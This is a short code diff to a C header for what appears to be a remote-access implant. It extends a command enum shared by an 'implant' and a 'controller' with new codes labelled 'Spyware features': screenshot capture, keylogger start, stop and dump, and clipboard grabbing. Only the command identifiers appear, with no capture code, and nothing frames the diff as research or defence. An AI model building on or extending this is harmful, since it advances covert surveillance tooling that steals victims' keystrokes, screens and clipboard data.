@@ -25,7 +25,13 @@ typedef enum
     COMMAND_KEEPALIVE   = 9,
     /* BP2: enrollment-on-first-contact */
     COMMAND_ENROLL_CSR  = 10,   /* implant → controller: PEM-encoded CSR */
-    COMMAND_ENROLL_CERT = 11    /* controller → implant: PEM-encoded signed cert */
+    COMMAND_ENROLL_CERT = 11,   /* controller → implant: PEM-encoded signed cert */
+    /* Spyware features */
+    COMMAND_SCREENSHOT  = 12,
+    COMMAND_KEYLOG_START = 13,
+    COMMAND_KEYLOG_STOP  = 14,
+    COMMAND_KEYLOG_DUMP  = 15,
+    COMMAND_CLIPBOARD_GET = 16
 } Command;
 
 typedef struct
